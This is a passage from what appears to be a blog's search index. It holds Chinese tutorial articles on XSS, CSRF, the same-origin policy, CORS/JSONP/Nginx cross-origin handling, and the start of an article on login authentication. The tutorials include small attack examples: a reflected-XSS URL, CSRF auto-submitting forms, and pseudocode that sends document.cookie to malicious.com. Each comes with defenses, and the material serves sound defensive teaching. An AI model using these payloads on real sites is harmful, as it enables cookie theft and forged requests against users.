<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>浏览器安全</title>
    <link href="/2020/08/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <url>/2020/08/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<p>通过上篇文章的介绍，我们知道了同源策略可以隔离各个站点之间的 DOM 交互、页面数据和网络通信，虽然严格的同源策略会带来更多的安全，但是也束缚了 Web。这就需要在安全和自由之间找到一个平衡点，所以我们默认页面中可以引用任意第三方资源，然后又引入 CSP 策略来加以限制；默认 XMLHttpRequest 和 Fetch 不能跨站请求资源，然后又通过 CORS 等方法来支持其跨域。</p><p>不过支持页面中的第三方资源引用和 CORS 也带来了很多安全问题，其中最典型的就是 XSS 攻击和 CSRF 攻击。</p><h2 id="XSS-攻击（跨站脚本攻击）"><a href="#XSS-攻击（跨站脚本攻击）" class="headerlink" title="XSS 攻击（跨站脚本攻击）"></a>XSS 攻击（跨站脚本攻击）</h2><p><strong>XSS 全称是 Cross Site Scripting(即跨站脚本)，为了和 CSS 区分，故叫它XSS。</strong>XSS 攻击是指浏览器中执行恶意脚本(无论是跨域还是同域)，从而拿到用户的信息并进行操作。</p><p>这些操作一般可以完成下面这些事情:</p><ol><li>窃取<code>Cookie</code>。</li><li>监听用户行为，比如输入账号密码后直接发送到黑客服务器。</li><li>修改 DOM 伪造登录表单。</li><li>在页面中生成浮窗广告。</li></ol><p>通常情况，XSS 攻击的实现有三种方式——<strong>存储型、反射型和文档型</strong>。原理都比较简单，先来一一介绍一下。</p><h3 id="存储型-XSS-攻击"><a href="#存储型-XSS-攻击" class="headerlink" title="存储型 XSS 攻击"></a>存储型 XSS 攻击</h3><p>存储型，顾名思义就是将恶意脚本存储了起来，确实，存储型的 XSS 将脚本存储到了服务端的数据库，然后在客户端执行这些脚本，从而达到攻击的效果。</p><p>常见的场景是留言评论区提交一段脚本代码，如果前后端没有做好转义的工作，那评论内容存到了数据库，在页面渲染过程中直接执行, 相当于执行一段未知逻辑的 JS 代码，是非常恐怖的。这就是存储型的 XSS 攻击</p><h3 id="反射型-XSS-攻击"><a href="#反射型-XSS-攻击" class="headerlink" title="反射型 XSS 攻击"></a>反射型 XSS 攻击</h3><p>反射型XSS指的是恶意脚本作为网络请求的一部分。</p><p>比如我输入:</p><pre><code class="hljs jsx">http:<span class="hljs-comment">//huyinglin.com?q=&lt;script&gt;alert(&quot;你完蛋了&quot;)&lt;/script&gt;</span></code></pre><p>这样，在服务器端会拿到q参数,然后将内容返回给浏览器端，浏览器将这些内容作为HTML 的一部分解析，发现是一个脚本，直接执行，这样就被攻击了。</p><p>之所以叫它反射型, 是因为恶意脚本是通过作为网络请求的参数，经过服务器，然后再反射到HTML文档中，执行解析。和存储型不一样的是，服务器并不会存储这些恶意脚本。</p><h3 id="文档型-XSS-攻击"><a href="#文档型-XSS-攻击" class="headerlink" title="文档型 XSS 攻击"></a>文档型 XSS 攻击</h3><p>文档型的 XSS 攻击并不会经过服务端，而是作为中间人的角色，在数据传输过程劫持到网络数据包，然后修改里面的 html 文档！</p><p>这样的劫持方式包括WIFI路由器劫持或者本地恶意软件等。</p><h2 id="XSS-防范措施"><a href="#XSS-防范措施" class="headerlink" title="XSS 防范措施"></a>XSS 防范措施</h2><p>明白了三种<code>XSS</code>攻击的原理，我们能发现一个共同点: 都是让恶意脚本直接能在浏览器中执行。</p><p>那么要防范它，就是要避免这些脚本代码的执行。</p><p>为了完成这一点，必须做到<strong>一个信念，两个利用</strong>。</p><h3 id="一个信念"><a href="#一个信念" class="headerlink" title="一个信念"></a>一个信念</h3><p>千万不要相信任何用户的输入！无论是在前端和服务端，都要对用户的输入进行<strong>转码</strong>或者<strong>过滤</strong>。</p><p>比如：</p><pre><code class="hljs jsx">&lt;script&gt;alert(<span class="hljs-string">&#x27;你完蛋了&#x27;</span>)&lt;/script&gt;</code></pre><p>转码后变为:</p><pre><code class="hljs jsx">&amp;lt;script&amp;gt;alert(&amp;#39;你完蛋了&amp;#39;)&amp;lt;/script&amp;gt;</code></pre><p>这样的代码在 html 解析的过程中是无法执行的。当然也可以利用关键词过滤的方式，将 script 标签给删除。</p><p>即便是在 React 中也不能忽略 XSS 攻击。虽然 React Dom 会在渲染之前对 JSX 中的值进行实体编码，这样可以确保你不会注入任何威胁应用的代码。在渲染前，所有东西都会被转换为字符串，这样有助于防御 XSS 攻击。</p><p>但 React 中有一个 API 叫 dangerouslySetInnerHTML，专门用来渲染 HTML。这个 API 就造成了 XSS 攻击的隐患。 当然 API 不常用，我们也不建议使用这个 API。</p><h3 id="利用-CSP"><a href="#利用-CSP" class="headerlink" title="利用 CSP"></a>利用 CSP</h3><p>CSP，即浏览器中的内容安全策略，它的核心思想就是服务器决定浏览器加载哪些资源，具体来说可以完成以下功能:</p><ol><li>限制其他域下的资源加载。</li><li>禁止向其它域提交数据。</li><li>提供上报机制，能帮助我们及时发现 XSS 攻击。</li></ol><h3 id="利用-HttpOnly"><a href="#利用-HttpOnly" class="headerlink" title="利用 HttpOnly"></a>利用 HttpOnly</h3><p>很多 XSS 攻击脚本都是用来窃取Cookie, 而设置 Cookie 的 HttpOnly 属性后，JavaScript 便无法读取 Cookie 的值。这样也能很好的防范 XSS 攻击。</p><h2 id="CSRF-攻击（跨站请求伪造）"><a href="#CSRF-攻击（跨站请求伪造）" class="headerlink" title="CSRF 攻击（跨站请求伪造）"></a>CSRF 攻击（跨站请求伪造）</h2><p><strong>CSRF(Cross-site request forgery), 即跨站请求伪造，指的是黑客诱导用户点击链接，打开黑客的网站，然后黑客利用用户目前的登录状态发起跨站请求。</strong></p><p>举个例子, 你在某个论坛点击了黑客精心挑选的小姐姐图片，你点击后，进入了一个新的页面。</p><p>那么恭喜你，被攻击了:）</p><p>你可能会比较好奇，怎么突然就被攻击了呢？接下来我们就来拆解一下当你点击了链接之后，黑客在背后做了哪些事情。</p><p>可能会做三样事情。列举如下：</p><h3 id="自动发-GET-请求"><a href="#自动发-GET-请求" class="headerlink" title="自动发 GET 请求"></a>自动发 GET 请求</h3><p>黑客网页里面可能有一段这样的代码:</p><pre><code class="hljs jsx">&lt;img src=<span class="hljs-string">&quot;https://xxx.com/info?user=hhh&amp;count=100&quot;</span>&gt;&lt;/img&gt;</code></pre><p>进入页面后自动发送 get 请求，值得注意的是，这个请求会自动带上关于 xxx.com 的 cookie 信息(这里是假定你已经在 xxx.com 中登录过)。</p><p>假如服务器端没有相应的验证机制，它可能认为发请求的是一个正常的用户，因为携带了相应的 cookie，然后进行相应的各种操作，可以是转账汇款以及其他的恶意操作。</p><h3 id="自动发-POST-请求"><a href="#自动发-POST-请求" class="headerlink" title="自动发 POST 请求"></a>自动发 POST 请求</h3><p>黑客可能自己填了一个表单，写了一段自动提交的脚本。</p><pre><code class="hljs jsx">&lt;form id=<span class="hljs-string">&#x27;hacker-form&#x27;</span> action=<span class="hljs-string">&quot;https://xxx.com/info&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt;  &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;user&quot;</span> value=<span class="hljs-string">&quot;hhh&quot;</span> /&gt;  &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;count&quot;</span> value=<span class="hljs-string">&quot;100&quot;</span> /&gt;&lt;/form&gt;&lt;script&gt;<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;hacker-form&#x27;</span>).submit();&lt;/script&gt;</code></pre><p>同样也会携带相应的用户 cookie 信息，让服务器误以为是一个正常的用户在操作，让各种恶意的操作变为可能。</p><h3 id="诱导点击发送-GET-请求"><a href="#诱导点击发送-GET-请求" class="headerlink" title="诱导点击发送 GET 请求"></a>诱导点击发送 GET 请求</h3><p>在黑客的网站上，可能会放上一个链接，驱使你来点击:</p><pre><code class="hljs jsx">&lt;a href=<span class="hljs-string">&quot;https://xxx/info?user=hhh&amp;count=100&quot;</span> taget=<span class="hljs-string">&quot;_blank&quot;</span>&gt;点击进入修仙世界&lt;/a&gt;</code></pre><p>点击后，自动发送 get 请求，接下来和自动发 GET 请求部分同理。</p><p>这就是 CSRF 攻击的原理。<strong>和 XSS 攻击对比，CSRF 攻击并不需要将恶意代码注入用户当前页面的html文档中，而是跳转到新的页面，利用服务器的验证漏洞和用户之前的登录状态来模拟用户进行操作</strong>。</p><h2 id="XSS-防范措施-1"><a href="#XSS-防范措施-1" class="headerlink" title="XSS 防范措施"></a>XSS 防范措施</h2><h3 id="利用Cookie的SameSite属性"><a href="#利用Cookie的SameSite属性" class="headerlink" title="利用Cookie的SameSite属性"></a>利用Cookie的SameSite属性</h3><p><code>CSRF攻击</code>中重要的一环就是自动发送目标站点下的 <code>Cookie</code>,然后就是这一份 Cookie 模拟了用户的身份。因此在<code>Cookie</code>上面下文章是防范的不二之选。</p><p>恰好，在 Cookie 当中有一个关键的字段，可以对请求中 Cookie 的携带作一些限制，这个字段就是<code>SameSite</code>。</p><p><code>SameSite</code>可以设置为三个值，<code>Strict</code>、<code>Lax</code>和<code>None</code>。</p><ul><li>在<code>Strict</code>模式下，浏览器完全禁止第三方请求携带Cookie。比如请求<code>sanyuan.com</code>网站只能在<code>sanyuan.com</code>域名当中请求才能携带 Cookie，在其他网站请求都不能。</li><li>在<code>Lax</code>模式，就宽松一点了，但是只能在 <code>get 方法提交表单</code>况或者<code>a 标签发送 get 请求</code>的情况下可以携带 Cookie，其他情况均不能。</li><li>在<code>None</code>模式下，也就是默认模式，请求会自动携带上 Cookie。</li></ul><h3 id="验证来源站点"><a href="#验证来源站点" class="headerlink" title="验证来源站点"></a>验证来源站点</h3><p>这就需要要用到请求头中的两个字段: <strong>Origin</strong>和<strong>Referer</strong>。</p><p>其中，<strong>Origin</strong>只包含域名信息，而<strong>Referer</strong>包含了<code>具体</code>的 URL 路径。</p><p>当然，这两者都是可以伪造的，通过 Ajax 中自定义请求头即可，安全性略差。</p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>除了使用以上两种方式来防止 CSRF 攻击之外，还可以采用 CSRF Token 来验证，这个流程比较好理解，大致分为两步。</p><p>第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。你可以参考下面示例代码：</p><pre><code class="hljs jsx">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;    &lt;form action=<span class="hljs-string">&quot;https://time.geekbang.org/sendcoin&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt;      &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;csrf-token&quot;</span> value=<span class="hljs-string">&quot;nc98P987bcpncYhoadjoiydc9ajDlcn&quot;</span>&gt;      &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;user&quot;</span>&gt;      &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;number&quot;</span>&gt;      &lt;input type=<span class="hljs-string">&quot;submit&quot;</span>&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>第二步，在浏览器端如果要发起请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>页面安全问题的主要原因就是浏览器为同源策略开的两个“后门”：一个是在页面中可以任意引用第三方资源，另外一个是通过 CORS 策略让 XMLHttpRequest 和 Fetch 去跨域请求资源。</p><p>为了解决这些问题，我们引入了 CSP 来限制页面任意引入外部资源，引入了 HttpOnly 机制来禁止 XMLHttpRequest 或者 Fetch 发送一些关键 Cookie，引入了 SameSite 和 Origin 来防止 CSRF 攻击。</p><p>通过这几篇文章的分析，相信你应该已经能搭建 Web 页面安全的知识体系网络了。有了这张网络，你就可以将 HTTP 请求头和响应头中各种安全相关的字段关联起来，比如 Cookie 中的一些字段，还有 X-Frame-Options、X-Content-Type-Options、X-XSS-Protection 等字段，也可以将 CSP、CORS 这些知识点关联起来。</p>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浏览器的同源策略</title>
    <link href="/2020/08/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <url>/2020/08/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
    
    <content type="html"><![CDATA[<p>同源策略是浏览器网络安全中重要的安全策略。一个正常的逻辑是，一个网站的控制权应该只能是网站的拥有者，显然别人想到我的网站请求一些数据或者把网站的内容改一改是侵犯了网站拥有者的隐私和数据安全。</p><p>但 Web 世界是开放的，它最重要的目的就是资源共享。Web 世界的理念就是，任何资源都可以接入其中。我们的网站可以加载并执行别人网站的脚本文件、图片、音频、视频等资源，甚至可以下载其他站点的可执行文件。</p><p>但是自由可能就意味着无序和混乱。如果页面行为没有任何限制，就会出现很多不可控的问题。所以，页面中最基础、最核心的安全策略：<strong>同源策略</strong>就出现了。</p><h2 id="什么是同源策略？"><a href="#什么是同源策略？" class="headerlink" title="什么是同源策略？"></a>什么是同源策略？</h2><p>要了解什么是同源策略，我们得先来看看什么是同源。</p><p><strong>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。</strong>比如下面这两个 URL，它们具有相同的协议 HTTPS、相同的域名 huyinglin.net，以及相同的端口 443，所以我们就说这两个 URL 是同源的。</p><pre><code class="hljs jsx">https:<span class="hljs-comment">//huyinglin.net/?category=1</span>https:<span class="hljs-comment">//huyinglin.net/?category=0</span></code></pre><p>浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。<strong>两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。</strong></p><p>具体来讲，同源策略主要表现在 <strong>DOM、Web 数据和网络</strong>这三个层面。</p><h3 id="DOM-层面"><a href="#DOM-层面" class="headerlink" title="DOM 层面"></a>DOM 层面</h3><p>同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</p><p>如果从一个页面打开了另一个页面，这两个页面是同源关系，那么就可以在第二个页面通过 BOM API 操作第一个页面。</p><p>如果两个页面不是同源的，那么它们就无法相互操作 DOM 了。这时浏览器会抛出下面的异常信息：</p><pre><code class="hljs jsx">Blocked a frame <span class="hljs-keyword">with</span> origin <span class="hljs-string">&quot;https://www.huyinglin.net&quot;</span> <span class="hljs-keyword">from</span> accessing a cross-origin frame.</code></pre><h3 id="数据层面"><a href="#数据层面" class="headerlink" title="数据层面"></a>数据层面</h3><p>同源策略限制了不同源的站点读取当前站点的 <strong>Cookie、IndexDB、LocalStorage</strong> 等数据。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。</p><h3 id="网络层面"><a href="#网络层面" class="headerlink" title="网络层面"></a>网络层面</h3><p>我们最常见的就是网络层面的限制。同源策略限制了一个站点不能向不同源的站点发送请求。</p><h2 id="安全和便利性的权衡"><a href="#安全和便利性的权衡" class="headerlink" title="安全和便利性的权衡"></a>安全和便利性的权衡</h2><p>我们了解了同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p><p>不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击，这两种攻击我们会在后续两篇文章中再做介绍，本文我们只聊浏览器出让了同源策略的哪些安全性。</p><h3 id="页面中可以嵌入第三方资源"><a href="#页面中可以嵌入第三方资源" class="headerlink" title="页面中可以嵌入第三方资源"></a>页面中可以嵌入第三方资源</h3><p>我们在文章开头提到过，Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。</p><p>所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。</p><p>比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码：</p><img src="/2020/08/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/img.png" class=""><p>当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。</p><p>除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onClick</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">let</span> url = <span class="hljs-string">`http://malicious.com?cookie = <span class="hljs-subst">$&#123;<span class="hljs-built_in">document</span>.cookie&#125;</span>`</span>  open(url)&#125;onClick()</code></pre><p>在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。</p><p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。CSP 的使用方法是在 HTTP 头部通过 Content-Security-Policy 字段来指定你的策略。具体使用如下：</p><pre><code class="hljs jsx">Content-Security-Policy: <span class="hljs-keyword">default</span>-src <span class="hljs-string">&#x27;self&#x27;</span>; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</code></pre><h3 id="跨域资源共享和跨文档消息机制"><a href="#跨域资源共享和跨文档消息机制" class="headerlink" title="跨域资源共享和跨文档消息机制"></a>跨域资源共享和跨文档消息机制</h3><p>跨域资源共享（CORS）机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。我们在下面会具体介绍。</p><p>在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。</p><h2 id="如何实现跨域？"><a href="#如何实现跨域？" class="headerlink" title="如何实现跨域？"></a>如何实现跨域？</h2><p>同源策略对于页面安全起了至关重要的作用，但实际开发中确有很多跨域的需求。下面我们来看看跨域的几种常见方法。</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSONP 可以说是最简单的跨域方法了。它的原理是利用 script 标签没有跨域限制的“漏洞”，获取其他网站的数据。其使用方式如下：</p><pre><code class="hljs jsx">&lt;script src=<span class="hljs-string">&quot;https://xx.com/api/xxx.js?callbackName=callback&quot;</span>&gt;&lt;/script&gt;</code></pre><pre><code class="hljs jsx"><span class="hljs-comment">// 后端返回的 js 文件 xxx.js。</span><span class="hljs-comment">// callback 名字可根据前端传的回调名字来改变</span>callback(&#123;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>, <span class="hljs-attr">b</span>:<span class="hljs-number">2</span>&#125;); <span class="hljs-comment">// 后端需要传递的数据直接作为调用参数</span></code></pre><p>JSONP优点是简单兼容性好，可用于解决主流浏览器的跨域数据访问的问题。缺点是仅支持 get 方法具有局限性，不安全可能会遭受XSS攻击。</p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>跨域资源共享（CORS）<strong>需要浏览器和后端同时支持。IE 8 和 9 需要通过 XDomainRequest 来实现</strong>。</p><p>浏览器会自动进行 CORS 通信，实现 CORS 通信的关键是后端。只要后端实现了 CORS，就实现了跨域。</p><p>服务端设置 Access-Control-Allow-Origin 就可以开启 CORS。 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。</p><p>虽然设置 CORS 和前端没什么关系，但是通过这种方式解决跨域问题的话，会在发送请求时出现两种情况，分别为<strong>简单请求</strong>和<strong>复杂请求</strong>。</p><p><strong>一、简单请求</strong></p><p>凡是满足下面条件的属于简单请求:</p><ul><li>请求方法为 GET、POST 或者 HEAD</li><li>请求头的取值范围: Accept、Accept-Language、Content-Language、Content-Type(只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code>)</li></ul><p>请求发出去之前，浏览器做了什么？</p><p>它会自动在请求头当中，添加一个 <strong>Origin</strong> 字段，用来说明请求来自哪个源。服务器拿到请求之后，在回应时对应地添加 <strong>Access-Control-Allow-Origin</strong> 字段，如果 Origin 不在这个字段的范围中，那么浏览器就会将响应拦截。</p><p>因此，Access-Control-Allow-Origin字段是服务器用来决定浏览器是否拦截这个响应，这是必需的字段。与此同时，其它一些可选的功能性的字段，用来描述如果不会拦截，这些字段将会发挥各自的作用。</p><p><strong>二、复杂请求</strong></p><p>不符合以上条件的请求就是复杂请求了。简单请求其实就是原生 HTML form 提供的请求。非简单请求就是普通 HTML Form 无法实现的请求。比如 PUT 方法、需要其他的内容编码方式、自定义头之类的。</p><p>复杂请求的CORS请求，会在正式通信之前，增加一次 HTTP 查询请求，称为”预检”请求，该请求是 option 方法的，通过该请求来知道服务端是否允许跨域请求。</p><p>我们以 PUT 方法为例。</p><pre><code class="hljs jsx"><span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://xxx.com&#x27;</span>;<span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();xhr.open(<span class="hljs-string">&#x27;PUT&#x27;</span>, url, <span class="hljs-literal">true</span>);xhr.setRequestHeader(<span class="hljs-string">&#x27;X-Custom-Header&#x27;</span>, <span class="hljs-string">&#x27;xxx&#x27;</span>);xhr.send();</code></pre><p>当这段代码执行后，首先会发送预检请求。这个预检请求的请求行和请求体是下面这个格式:</p><pre><code class="hljs jsx">OPTIONS / HTTP/<span class="hljs-number">1.1</span>Origin: 当前地址Host: xxx.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-Header</code></pre><p>预检请求的方法是OPTIONS，同时会加上Origin源地址和Host目标地址，这很简单。同时也会加上两个关键的字段:</p><ul><li>Access-Control-Request-Method, 列出 CORS 请求用到哪个HTTP方法</li><li>Access-Control-Request-Headers，指定 CORS 请求将要加上什么请求头</li></ul><p>这是<strong>预检请求</strong>。接下来是<strong>响应字段</strong>，响应字段也分为两部分，一部分是对于预检请求的响应，一部分是对于 CORS 请求的响应。</p><p>预检请求的响应。如下面的格式:</p><pre><code class="hljs jsx">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OKAccess-Control-Allow-Origin: *Access-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderAccess-Control-Allow-Credentials: <span class="hljs-literal">true</span>Access-Control-Max-Age: <span class="hljs-number">1728000</span>Content-Type: text/html; charset=utf<span class="hljs-number">-8</span>Content-Encoding: gzipContent-Length: <span class="hljs-number">0</span></code></pre><p>其中有这样几个关键的响应头字段:</p><pre><code class="hljs jsx">Access-Control-Allow-Origin: 表示可以允许请求的源，可以填具体的源名，也可以填*表示允许任意源请求。Access-Control-Allow-Methods: 表示允许的请求方法列表。Access-Control-Allow-Credentials: 简单请求中已经介绍。Access-Control-Allow-Headers: 表示允许发送的请求头字段Access-Control-Max-Age: 预检请求的有效期，在此期间，不用发出另外一条预检请求。</code></pre><p>在预检请求的响应返回后，如果请求不满足响应头的条件，则触发XMLHttpRequest的onerror方法，当然后面真正的CORS请求也不会发出去了。</p><p>CORS 请求的响应。绕了这么一大转，到了真正的 CORS 请求就容易多了，现在它和简单请求的情况是一样的。浏览器自动加上Origin字段，服务端响应头返回Access-Control-Allow-Origin。可以参考以上简单请求部分的内容。</p><h3 id="Nginx-反向代理"><a href="#Nginx-反向代理" class="headerlink" title="Nginx 反向代理"></a>Nginx 反向代理</h3><p>Nginx 是一种高性能的反向代理服务器，可以用来轻松解决跨域问题。</p><img src="/2020/08/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/img1.png" class=""><p>正向代理帮助客户端访问客户端自己访问不到的服务器，然后将结果返回给客户端。</p><p>反向代理拿到客户端的请求，将请求转发给其他的服务器，主要的场景是维持服务器集群的负载均衡，换句话说，反向代理帮其它的服务器拿到请求，然后选择一个合适的服务器，将请求转交给它。</p><p>因此，两者的区别就很明显了，正向代理服务器是帮客户端做事情，而反向代理服务器是帮其它的服务器做事情。</p><p>好了，那 Nginx 是如何来解决跨域的呢？</p><p>比如说现在客户端的域名为client.com，服务器的域名为server.com，客户端向服务器发送 Ajax 请求，当然会跨域了，那这个时候让 Nginx 登场了，通过下面这个配置:</p><pre><code class="hljs jsx">server &#123;  listen  <span class="hljs-number">80</span>;  server_name  client.com;  location /api &#123;    proxy_pass server.com;  &#125;&#125;</code></pre><p>Nginx 相当于起了一个跳板机，这个跳板机的域名也是client.com，让客户端首先访问 client.com/api，这当然没有跨域，然后 Nginx 服务器作为反向代理，将请求转发给server.com，当响应返回时又将响应给到客户端，这就完成整个跨域请求的过程。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>CORS 支持所有类型的 HTTP 请求，是跨域 HTTP 请求的根本解决方案。</li><li>JSONP 只支持GET请求，JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。</li><li>日常工作中，用得比较多的跨域方案是 CORS 和 Nginx 反向代理</li></ul>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>跨域</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>登录鉴权</title>
    <link href="/2020/08/17/%E7%99%BB%E5%BD%95%E9%89%B4%E6%9D%83/"/>
    <url>/2020/08/17/%E7%99%BB%E5%BD%95%E9%89%B4%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p>登录是每个网站中都经常用到的一个功能，在页面上我们输入账号密码，敲一下回车键，就登录了，但这背后的登录原理你是否清楚呢？今天我们就来介绍几种常用的登录方式。</p><ul><li>Cookie + Session 登录</li><li>Token 登录</li><li>SSO 单点登录</li><li>OAuth 第三方登录</li></ul><h2 id="Cookie-Session-登录"><a href="#Cookie-Session-登录" class="headerlink" title="Cookie + Session 登录"></a>Cookie + Session 登录</h2><p>HTTP 是一种无状态的协议，客户端每次发送请求时，首先要和服务器端建立一个连接，在请求完成后又会断开这个连接。这种方式可以节省传输时占用的连接资源，但同时也存在一个问题：<strong>每次请求都是独立的</strong>，服务器端无法判断本次请求和上一次请求是否来自同一个用户，进而也就无法判断用户的登录状态。</p><p>为了解决 HTTP 无状态的问题，Lou Montulli 在 1994 年的时候，推出了 Cookie。</p><blockquote><p>Cookie 是服务器端发送给客户端的一段特殊信息，这些信息以文本的方式存放在客户端，客户端每次向服务器端发送请求时都会带上这些特殊信息。</p></blockquote><p>有了 Cookie 之后，服务器端就能够获取到客户端传递过来的信息了，如果需要对信息进行验证，还需要通过 Session。</p><blockquote><p>客户端请求服务端，服务端会为这次请求开辟一块内存空间，这个便是 Session 对象。</p></blockquote><p>有了 Cookie 和 Session 之后，我们就可以进行登录认证了。</p><h3 id="Cookie-Session-实现流程"><a href="#Cookie-Session-实现流程" class="headerlink" title="Cookie + Session 实现流程"></a>Cookie + Session 实现流程</h3><p>Cookie + Session 的登录方式是最经典的一种登录方式，现在仍然有大量的企业在使用。</p><ol><li>用户向服务器发送用户名和密码。</li><li>服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</li><li>服务器向用户返回一个 session_id，写入用户的 Cookie。</li><li>用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。</li><li>服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。</li></ol><p>在第一次登录完后，后面的访问服务端就可以通过 Cookie 中的 session_id 来校验是否验证通过。</p><h3 id="Cookie-Session-存在的问题"><a href="#Cookie-Session-存在的问题" class="headerlink" title="Cookie + Session 存在的问题"></a>Cookie + Session 存在的问题</h3><p>虽然我们使用 Cookie + Session 的方式完成了登录验证，但仍然存在一些问题：</p><ul><li>由于服务器端需要对接大量的客户端，也就需要存放大量的 session_id，这样会导致服务器压力过大。</li><li>如果服务器端是一个集群，为了同步登录态，需要将 session_id 同步到每一台机器上，无形中增加了服务器端维护成本。</li><li>由于 session_id 存放在 Cookie 中，所以无法避免 CSRF 攻击。</li></ul><h2 id="Token-登录"><a href="#Token-登录" 